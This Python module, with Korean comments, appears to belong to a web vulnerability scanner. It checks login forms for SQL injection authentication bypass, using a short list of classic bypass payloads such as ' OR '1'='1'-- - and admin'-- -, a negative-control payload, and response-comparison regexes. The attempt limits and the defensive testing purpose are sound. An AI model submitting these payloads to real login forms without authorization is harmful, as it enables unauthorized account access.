"""
login_sqli.py — 로그인 폼 SQLi/인증 우회 '안전' 점검 (비파괴, 비브루트포스).

정책:
  - 동일 폼 최대 3회 시도(MAX_ATTEMPTS). 반복 로그인/credential stuffing/brute force 금지.
  - Safe payload(' OR '1'='1 등, time-based 금지)만 사용.
  - baseline(무해 입력) 대비 응답 비교: status/length/redirect/SQL error/login failure/diff.
  - 결과는 상태값(enum)으로 보고. 절대 'CONFIRMED 취약'을 단독 부여하지 않음(안전 점검).

HTTP I/O 는 주입 가능한 콜러블(get_fn/post_fn)로 받아 테스트에서 monkeypatch 한다.
"""
from __future__ import annotations

import re

MAX_ATTEMPTS = 3

# 상태값
TESTED_SAFE_NO_SIGNAL = "TESTED_SAFE_NO_SIGNAL"
TESTED_SAFE_POSSIBLE = "TESTED_SAFE_POSSIBLE"
CONFIRMED_AUTH_BYPASS = "CONFIRMED_AUTH_BYPASS"   # 음성 대조 차등으로 확증된 인증 우회
SKIPPED_POLICY = "SKIPPED_POLICY"
SKIPPED_NO_FORM_ACTION = "SKIPPED_NO_FORM_ACTION"
SKIPPED_AUTH_CRAWL_DISABLED = "SKIPPED_AUTH_CRAWL_DISABLED"
MANUAL_REVIEW_REQUIRED = "MANUAL_REVIEW_REQUIRED"

# 로그인 필드명 후보(단일 출처). active_probing 이 이 리스트를 재사용한다(예전엔 각자 정의해
# "passw" 누락 등 드리프트가 있었음).
_USERNAME_FIELDS = ("username", "userid", "user", "email", "login", "uid", "id", "j_username")
_PASSWORD_FIELDS = ("password", "passwd", "pwd", "pass", "passw", "j_password")


def login_coverage_reason(discovered: int, parsed: int, performed: int,
                          probe_reason: str = "") -> str:
    """로그인 폼 점검 '미수행 사유'를 발견/파싱/수행 수와 모순 없이 결정한다.

    discovered: 발견된 로그인 페이지/폼 수(관리자 발견 포함)
    parsed    : 폼 구조(action/필드) 파싱에 성공한 폼 수
    performed : 실제 안전 점검을 수행한 폼 수
    반환: 사유 문자열(수행됨이면 "").
    """
    if discovered <= 0:
        return "로그인 폼 미발견"
    if parsed <= 0:
        # 로그인 페이지는 발견했으나 폼 구조 추출 실패 — '미발견' 아님
        return "로그인 폼 구조 분석 실패(action/필드 추출 불가)"
    if performed <= 0:
        return probe_reason or "점검 조건 불충족(필드/폼 action 부족)"
    return ""

_SQL_ERROR_RE = re.compile(
    r"(sql syntax|mysql_fetch|ORA-\d{4,}|psql:|syntax error|unclosed quotation|"
    r"sqlite3\.|SQLException|ODBC|JDBC|PG::SyntaxError|near \".*\": syntax error|"
    r"you have an error in your sql)", re.IGNORECASE)
_LOGIN_FAIL_RE = re.compile(
    r"(invalid (username|user|login|password|credentials)|로그인 (실패|정보가)|"
    r"아이디 또는 비밀번호|incorrect password|authentication failed|login failed|"
    r"존재하지 않는|다시 시도|"
    # Dreamhack/PHP류 흔한 실패 처리(alert 후 뒤로가기) — 실패 신호로 인식
    r"alert\(['\"]?(wrong|fail|failed|error|invalid|no such)|history\.go\(-1\))",
    re.IGNORECASE)
_LOGIN_SUCCESS_RE = re.compile(
    r"(logout|sign\s?out|로그아웃|dashboard|my\s?account|내\s?정보|profile|환영합니다|welcome[,!\s]|"
    # 로그인 성공 시 흔한 인사/플래그 노출 — 성공 신호로 인식
    r"hello\s+\w|hi\s+\w|반갑|flag(\s+is|[\s:{_])|DH\{|FLAG\{)",
    re.IGNORECASE)

# Safe payload (time-based 금지). 싱글/더블쿼트 컨텍스트를 모두 커버하고, MySQL 주석은
# 반드시 '-- '(대시대시+공백) 형태로 — 뒤 공백 없는 '--' 는 MySQL 에서 주석 처리 안 됨.
SAFE_PAYLOADS = [
    'admin"-- -',        # 더블쿼트 컨텍스트 + admin 계정 지정
    "admin'-- -",        # 싱글쿼트 컨텍스트 + admin 계정 지정
    '" OR "1"="1"-- -',  # 더블쿼트 OR-true
    "' OR '1'='1'-- -",  # 싱글쿼트 OR-true
    '" OR 1=1-- -',      # 더블쿼트 무따옴표 OR-true
    "' OR 1=1-- -",      # 싱글쿼트 무따옴표 OR-true
    'admin"#',           # MySQL 해시 주석(더블쿼트)
    "admin'#",           # MySQL 해시 주석(싱글쿼트)
]

# 음성 대조(negative control) — 우회 payload 와 SQL 구조는 같고 조건만 '항상 거짓'으로 뒤집은 payload.
# 우회는 성공하고 이 대조는 실패해야(응답이 참/거짓에 따라 갈림) '불리언 기반 인증 우회'로 차등 확증한다.
FALSE_CONTROL_SINGLE = "' AND '1'='2'-- -"
FALSE_CONTROL_DOUBLE = '" AND "1"="2"-- -'


def _false_control_for(payload: str) -> str:
    """우회 payload 의 따옴표 컨텍스트에 맞춘 음성 대조 payload 선택."""
    p = payload or ""
    if '"' in p and "'" not in p:
        return FALSE_CONTROL_DOUBLE
    return FALSE_CONTROL_SINGLE


def _baseline_authenticates(baseline: dict) -> bool:
    """baseline(엉뚱한 자격증명)이 이미 로그인 성공처럼 보이면 대조가 무의미 → True."""
    b = baseline.get("body", "") or ""
    return bool(_LOGIN_SUCCESS_RE.search(b)) and not bool(_LOGIN_FAIL_RE.search(b))




def identify_login_fields(field_names) -> tuple[str | None, str | None]:
    """필드명 집합에서 username/password 필드를 자동 식별."""
    names = [str(n) for n in (field_names or [])]
    low = {n.lower(): n for n in names}
    pw = next((low[c] for c in _PASSWORD_FIELDS if c in low), None)
    user = next((low[c] for c in _USERNAME_FIELDS if c in low), None)
    return user, pw


# 폼 전체 기본 body 추출용 — parse_forms 가 버리는 submit 버튼·input value 까지 포함한다.
_INPUT_TAG_RE = re.compile(r"<(?:input|button)\b[^>]*>", re.IGNORECASE)


def _all_input_defaults(html: str) -> list[tuple[str, str, str]]:
    """html 의 모든 input/button → (name, value, type). submit/hidden 값까지 포함(실제 브라우저 body 재현용)."""
    out = []
    for tag in _INPUT_TAG_RE.findall(html or ""):
        nm = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.IGNORECASE)
        if not nm:
            continue
        val = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.IGNORECASE)
        typ = re.search(r'type\s*=\s*["\']([^"\']+)["\']', tag, re.IGNORECASE)
        out.append((nm.group(1), val.group(1) if val else "",
                    (typ.group(1).lower() if typ else "text")))
    return out


def find_login_forms(html: str, page_url: str) -> list[dict]:
    """페이지 HTML 에서 로그인 폼(password 입력 보유)을 추출한다.
    password 필드는 '이름'이 아니라 input_type='password' 로 식별(비표준 명명 대응)."""
    import input_points as ip
    forms: dict = {}
    for p in ip.parse_forms(html, page_url):
        key = (p.get("method", "POST"), p.get("url", page_url))
        forms.setdefault(key, []).append(p)
    out = []
    for (method, action), pts in forms.items():
        names = [pt.get("param") for pt in pts]
        # 1) password: input_type=password 우선, 없으면 이름 매칭
        pw = next((pt.get("param") for pt in pts
                   if (pt.get("input_type") or "").lower() == "password"), None)
        # 2) username: text/email 입력 중 username 계열 이름, 없으면 첫 비-password 텍스트
        user = None
        for pt in pts:
            nm = str(pt.get("param", "")).lower()
            it = (pt.get("input_type") or "text").lower()
            if it == "password":
                continue
            if nm in _USERNAME_FIELDS or it == "email":
                user = pt.get("param")
                break
        if user is None:
            user = next((pt.get("param") for pt in pts
                         if (pt.get("input_type") or "text").lower() in ("text", "email")
                         and pt.get("param") != pw), None)
        _name_user, _name_pw = identify_login_fields(names)
        pw = pw or _name_pw
        user = user or _name_user
        if not pw:
            continue  # password 입력 없는 폼은 로그인 폼 아님
        # 실제 브라우저가 보내는 전체 body(submit 버튼·hidden 기본값 포함) 구성.
        # 로그인 페이지는 보통 단일 폼이라 페이지 전체 input 을 취합(근사).
        default_body = {}
        for nm, val, typ in _all_input_defaults(html):
            default_body[nm] = "" if typ == "password" else val
        if user:
            default_body.setdefault(user, "")
        default_body.setdefault(pw, "")
        out.append({
            "action": action, "method": method or "POST",
            "username_field": user, "password_field": pw,
            "fields": names, "default_body": default_body,
        })
    return out


# 리다이렉트 목적지가 로그인/에러 페이지면 '실패', 그 외(대시보드/메인 등)면 '성공'으로 본다.
# (로그인 성공·실패가 둘 다 302 인 경우 Location 목적지가 유일한 판별 기준 — 예: testfire
#  실패→login.jsp / 성공→/bank/main.jsp)
# 실패(로그인/에러 페이지로 되돌림) 판별 토큰. 'auth' 는 성공 URL(/authenticated 등)을 오인하므로 제외.
_LOGIN_REDIRECT_RE = re.compile(
    r"(login|signin|sign-in|sign_in|logon|log-in|error|fail|denied|invalid|unauthor|forbidden)",
    re.IGNORECASE)


def _signals(baseline: dict, resp: dict) -> dict:
    """baseline 대비 응답 신호 비교(리다이렉트 목적지까지 반영)."""
    b_status = baseline.get("status", 0)
    r_status = resp.get("status", 0)
    b_body = baseline.get("body", "") or ""
    r_body = resp.get("body", "") or ""
    r_loc = str(resp.get("final_url") or "")
    b_loc = str(baseline.get("final_url") or "")
    sql_error = bool(_SQL_ERROR_RE.search(r_body))
    # 리다이렉트 목적지 판정: 로그인/에러로 되돌리면 실패, 다른 페이지(그리고 baseline=실패와 다름)로 가면 성공
    redirect_to_login = bool(r_loc) and bool(_LOGIN_REDIRECT_RE.search(r_loc))
    success_redirect = bool(r_loc) and not redirect_to_login and r_loc != b_loc
    failure = bool(_LOGIN_FAIL_RE.search(r_body)) or redirect_to_login
    success = bool(_LOGIN_SUCCESS_RE.search(r_body)) or success_redirect
    redirect = (bool(r_loc) and r_loc != b_loc) or (300 <= r_status < 400)
    len_diff = abs(len(r_body) - len(b_body)) > max(40, int(0.1 * max(len(b_body), 1)))
    status_diff = r_status != b_status
    return {
        "status_diff": bool(status_diff), "length_diff": bool(len_diff),
        "redirect": bool(redirect), "sql_error": sql_error,
        "login_failure": bool(failure), "login_success": bool(success),
        "success_redirect": bool(success_redirect),
        "response_diff": bool(status_diff or len_diff or redirect),
    }


def _status_from_signals(s: dict) -> str:
    import probe_policy as pp
    grade = pp.judge_login_sqli(
        url_changed=s["redirect"], logout_seen=s["login_success"],
        dashboard_seen=s["login_success"], failure_absent=not s["login_failure"],
        db_error=s["sql_error"], response_diff=s["response_diff"],
    )
    if grade in ("CONFIRMED", "LIKELY"):
        return MANUAL_REVIEW_REQUIRED   # 안전 점검은 단독 CONFIRMED 금지 → 수동 검토
    if grade in ("POSSIBLE", "MANUAL_REVIEW"):
        return TESTED_SAFE_POSSIBLE
    return TESTED_SAFE_NO_SIGNAL


async def safe_login_sqli_check(login_form: dict, post_fn, get_fn=None,
                                payloads=None, max_attempts: int = MAX_ATTEMPTS) -> dict:
    """단일 로그인 폼에 대한 SQLi 안전 점검. post_fn(url, data)->{status,body,final_url}.

    반환: {status, attempts, signals, payload, username_field, password_field, action}.
    """
    action = login_form.get("action")
    pw_field = login_form.get("password_field")
    user_field = login_form.get("username_field") or "username"
    if not action:
        return {"status": SKIPPED_NO_FORM_ACTION, "attempts": 0, "action": action}
    if not pw_field:
        return {"status": SKIPPED_NO_FORM_ACTION, "attempts": 0, "action": action}

    payloads = (payloads or SAFE_PAYLOADS)[:max_attempts]

    # baseline: 무해한 잘못된 자격증명(반복 로그인/실계정 아님)
    try:
        baseline = await post_fn(action, {user_field: "eoseureum_probe_user", pw_field: "eoseureum_probe_pw"})
    except Exception:
        return {"status": SKIPPED_NO_FORM_ACTION, "attempts": 0, "action": action}
    baseline = baseline or {}

    attempts = 0
    best = {"status": TESTED_SAFE_NO_SIGNAL, "signals": {}, "payload": None}
    for pl in payloads:
        if attempts >= max_attempts:
            break
        attempts += 1
        try:
            resp = await post_fn(action, {user_field: pl, pw_field: pl}) or {}
        except Exception:
            continue
        sig = _signals(baseline, resp)
        st = _status_from_signals(sig)
        if st == MANUAL_REVIEW_REQUIRED:
            # 음성 대조 차등 확증: 논리를 '항상 거짓'으로 뒤집은 대조 payload 로 재확인.
            # 우회는 성공했는데 대조는 실패하고 baseline 도 실패면 → 불리언 기반 인증 우회 확증.
            # (대조 요청 1회는 확증용으로 attempts 에 포함하지 않음 — 브루트포스 아님)
            ctrl = _false_control_for(pl)
            ctrl_sig, control_success = {}, None
            if not _baseline_authenticates(baseline):
                try:
                    cresp = await post_fn(action, {user_field: ctrl, pw_field: ctrl}) or {}
                    ctrl_sig = _signals(baseline, cresp)
                    # login_success 는 이미 '성공 리다이렉트(로그인 아님 + baseline 과 다른 목적지)'와
                    # 본문 성공신호를 반영함 → 이 단일 신호로 판정(느슨한 redirect 폴백 금지: baseline 과
                    # 같은 목적지로 되돌아가는 실패를 성공으로 오인하던 문제 제거).
                    control_success = bool(ctrl_sig.get("login_success"))
                except Exception:
                    control_success = None
            if control_success is False:
                return {"status": CONFIRMED_AUTH_BYPASS, "attempts": attempts, "signals": sig,
                        "payload": pl, "control_payload": ctrl, "control_signals": ctrl_sig,
                        "username_field": user_field, "password_field": pw_field, "action": action}
            # 대조도 성공(허위신호) → 승격하지 않되, 첫 신호에서 멈추지 말고 남은 payload 를
            # 계속 시도해 '진짜 불리언 우회'를 찾는다(여전히 ≤max_attempts).
            best = {"status": MANUAL_REVIEW_REQUIRED, "signals": sig, "payload": pl}
            continue
        if st == TESTED_SAFE_POSSIBLE and best["status"] == TESTED_SAFE_NO_SIGNAL:
            best = {"status": st, "signals": sig, "payload": pl}
    return {"status": best["status"], "attempts": attempts, "signals": best["signals"],
            "payload": best["payload"], "username_field": user_field,
            "password_field": pw_field, "action": action}
